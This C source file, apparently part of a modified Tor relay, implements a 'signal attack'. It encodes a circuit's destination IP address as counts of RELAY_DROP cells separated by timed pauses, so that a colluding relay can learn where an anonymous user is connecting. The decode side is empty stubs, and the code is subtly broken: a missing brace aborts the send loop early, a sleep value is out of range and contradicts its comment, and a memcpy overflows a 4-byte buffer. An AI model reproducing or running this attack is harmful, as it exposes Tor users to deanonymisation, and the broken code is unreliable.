

#include "or.h"
#include "relay.h"
#include "orconfig.h"
#include "config.h"
#include "compat.h"
#include <time.h>
#include <unistd.h>
#define TOR_SIGNAL_ATTACK_PRIVATE
#include "signal_attack.h"

static int signal_send_relay_drop(int nbr, circuit_t *circ) {
  while (nbr > 0) {
    if (relay_send_command_from_edge_(0, circ,
                                RELAY_COMMAND_DROP, NULL, 0,
                                TO_ORIGIN_CIRCUIT(circ)->cpath->prev, __FILE__, __LINE__) < 0)
      log_debug(LD_BUG, "Signal not completly sent");
      return -1;
    nbr--;
  }
  return 0;
}

// TODO: Experiment with nanosleep
static void signal_bandwidth_efficient(char *address, circuit_t *circ) {

}
STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
  struct timespec time, rem;
  time.tv_sec = 0;
  time.tv_nsec = 2000000000L; // 200ms => Todo set time as a control option 
  char tmp_subaddress[4];
  int tmp_subip;
  tmp_subaddress[3] = '\0';
  for (int i = 1; i < 4; i++) {
    memcpy(tmp_subaddress, &address[4*i-4], 4*i-2);
    tmp_subip = atoi(tmp_subaddress);
    if (signal_send_relay_drop(tmp_subip, circ) < 0) {
      return -1;
    }
    /*sleep(1); //sleep 1second*/
    if (nanosleep(&time, &rem) < 0) {
      log_debug(LD_BUG, "nanosleep call failed \n");
      return -1;
    }
  }
  return 0;
}

static int signal_bandwidth_efficient_decode() {

  return 0;
}
static int signal_minimize_blank_latency_decode() {
  return 0;
}
STATIC int signal_listen_and_decode() {
  
  const or_options_t *options = get_options();
  switch (options->SignalMethod) {
    case 0: return signal_bandwidth_efficient_decode();
            break;
    case 1: return signal_minimize_blank_latency_decode();
            break;
    default:
      log_debug(LD_BUG, "signal_listen_and_decode switch: no correct case\n");
      return -1;
  }

  return 0;
}




void signal_encode_destination(char *address, circuit_t *circ) {
  const or_options_t *options = get_options();
  switch (options->SignalMethod) {
    case 0: signal_bandwidth_efficient(address, circ);
            break;
    case 1: signal_minimize_blank_latency(address, circ);
  }
}


